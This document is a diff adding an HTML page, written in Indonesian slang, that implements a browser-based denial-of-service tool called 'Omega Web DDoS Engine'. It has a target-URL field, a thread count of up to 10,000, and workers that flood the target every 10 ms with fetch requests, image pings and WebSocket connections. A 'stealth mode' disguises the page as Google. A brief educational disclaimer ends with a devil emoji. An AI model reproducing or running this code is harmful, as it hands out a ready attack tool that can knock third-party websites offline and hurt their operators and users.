@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Online - Loading...</title>
+    <style>
+        * { margin: 0; padding: 0; }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+        }
+        .container {
+            padding: 20px;
+        }
+        h1 { color: #ff0000; text-align: center; margin: 20px; }
+        .status {
+            border: 2px solid #0f0;
+            padding: 15px;
+            margin: 10px;
+            border-radius: 5px;
+        }
+        .btn {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            margin: 10px;
+            cursor: pointer;
+            font-size: 18px;
+            border-radius: 5px;
+        }
+        .btn:hover { background: #cc0000; }
+        .hidden { display: none; }
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.3;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    
+    <div class="container">
+        <h1>🚀 NETWORK TOOL 🚀</h1>
+        
+        <div class="status">
+            <h3>🔧 CONTROL PANEL</h3>
+            <p>Target URL: <input type="text" id="targetUrl" placeholder="https://example.com" style="width: 300px; padding: 5px;"></p>
+            <p>Threads: <input type="number" id="threadCount" value="100" min="1" max="10000" style="width: 100px; padding: 5px;"></p>
+            <p>Attack Power: <span id="powerLevel">MEDIUM</span></p>
+            <progress id="powerBar" value="50" max="100"></progress>
+        </div>
+
+        <div style="text-align: center;">
+            <button class="btn" onclick="startAttack()">🔥 LAUNCH ATTACK</button>
+            <button class="btn" onclick="stopAttack()">⏹ STOP ATTACK</button>
+            <button class="btn" onclick="stealthMode()">👁 STEALTH MODE</button>
+        </div>
+
+        <div class="status" id="logPanel">
+            <h3>📡 SYSTEM LOGS:</h3>
+            <div id="logs" style="height: 200px; overflow-y: scroll; background: #111; padding: 10px;"></div>
+        </div>
+
+        <div class="status">
+            <p><strong>⚠️ PERINGATAN :</strong> Tools ini cuma buat edukasi dan testing security website sendiri. Jangan disalahgunakan! Tanggung jawab sepenuhnya ada di tangan lu, bro. 😈</p>
+        </div>
+    </div>
+
+    <script>
+        // Matrix background effect
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = 'Dapz Hetters';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0F0';
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+
+        // Omega DDoS Engine
+        class OmegaWebDDoS {
+            constructor() {
+                this.workers = [];
+                this.isRunning = false;
+                this.requestCount = 0;
+                this.log('🚀 Omega Web DDoS Engine Loaded');
+            }
+
+            log(message) {
+                const logDiv = document.getElementById('logs');
+                const entry = document.createElement('p');
+                entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+                logDiv.appendChild(entry);
+                logDiv.scrollTop = logDiv.scrollHeight;
+            }
+
+            async startAttack(targetUrl, threads) {
+                if (this.isRunning) {
+                    this.log('⚠️ Attack sudah berjalan!');
+                    return;
+                }
+
+                this.isRunning = true;
+                this.log(`🔥 Starting attack on ${targetUrl} with ${threads} threads`);
+                
+                // Multiple attack vectors
+                for (let i = 0; i < threads; i++) {
+                    const worker = {
+                        id: i,
+                        interval: setInterval(() => {
+                            // Technique 1: HTTP Flood
+                            fetch(targetUrl, {
+                                mode: 'no-cors',
+                                cache: 'no-store'
+                            }).catch(() => {});
+
+                            // Technique 2: Image ping flood
+                            const img = new Image();
+                            img.src = `${targetUrl}?rand=${Math.random()}`;
+
+                            // Technique 3: WebSocket connection spam
+                            try {
+                                const ws = new WebSocket(targetUrl.replace('http', 'ws'));
+                                setTimeout(() => ws.close(), 100);
+                            } catch(e) {}
+
+                            this.requestCount++;
+                            if (this.requestCount % 1000 === 0) {
+                                document.getElementById('powerBar').value = 
+                                    Math.min(100, this.requestCount / 100);
+                                document.getElementById('powerLevel').textContent = 
+                                    this.requestCount > 5000 ? 'EXTREME' : 
+                                    this.requestCount > 1000 ? 'HIGH' : 'MEDIUM';
+                            }
+                        }, 10)
+                    };
+                    this.workers.push(worker);
+                }
+
+                this.log(`✅ ${threads} attack workers activated`);
+            }
+
+            stopAttack() {
+                this.isRunning = false;
+                this.workers.forEach(worker => clearInterval(worker.interval));
+                this.workers = [];
+                this.log('⏹ All attack workers stopped');
+            }
+        }
+
+        const omegaEngine = new OmegaWebDDoS();
+
+        // UI Controls
+        function startAttack() {
+            const target = document.getElementById('targetUrl').value;
+            const threads = parseInt(document.getElementById('threadCount').value);
+            
+            if (!target) {
+                omegaEngine.log('❌ Masukkan target URL dulu!');
+                return;
+            }
+
+            omegaEngine.startAttack(target, threads);
+        }
+
+        function stopAttack() {
+            omegaEngine.stopAttack();
+        }
+
+        function stealthMode() {
+            document.title = "Google - Search";
+            document.body.style.backgroundColor = "#fff";
+            document.body.style.color = "#000";
+            document.querySelector('h1').textContent = "Google";
+            omegaEngine.log('👁 Stealth mode activated - Disguised as GoogleId');
+        }
+
+        // Auto-clear logs setiap 30 detik
+        setInterval(() => {
+            if (Math.random() > 0.7) {
+                omegaEngine.log(`📊 Requests sent: ${omegaEngine.requestCount.toLocaleString()}`);
+            }
+        }, 30000);
+
+        omegaEngine.log('✅ Sistem siap. Masukkan target dan tekan LAUNCH.');
+    </script>
+</body>
+</html>
